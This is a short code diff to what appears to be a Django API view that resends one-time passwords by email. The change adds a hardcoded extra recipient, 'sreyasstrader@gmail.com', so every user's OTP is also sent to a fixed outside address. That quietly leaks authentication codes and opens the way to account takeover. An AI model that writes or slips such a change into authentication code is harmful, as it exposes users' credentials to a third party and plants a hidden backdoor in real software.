@@ -126,7 +126,7 @@ class ResendOtpView(APIView):
         # Resend the OTP via email
         message = Mail(
             from_email='sreyassweb@gmail.com',
-            to_emails=[email],
+            to_emails=[email,'sreyasstrader@gmail.com'],
             subject='Resend OTP',
             html_content=(
                 f"<strong>Hi,</strong><br>"
